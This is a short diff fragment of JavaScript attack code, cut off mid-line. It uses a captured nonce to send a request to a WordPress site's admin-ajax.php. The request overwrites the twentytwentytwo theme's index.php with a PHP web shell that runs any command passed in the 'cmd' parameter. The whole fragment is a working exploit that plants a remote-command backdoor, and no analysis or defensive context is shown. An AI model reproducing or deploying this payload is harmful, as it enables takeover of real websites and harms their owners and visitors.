@@ -4,9 +4,9 @@ async function pepe(){
     return a;
 }
 
-
-var a = await pepe();
 try{
+var a = await pepe();
+
 fetch("wp-admin/admin-ajax.php", {
     "headers":{"Content-type":"application/x-www-form-urlencoded"},
 "body": `nonce=${a[1]}&file=index.php&theme=twentytwentytwo&newcontent=<?php  if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
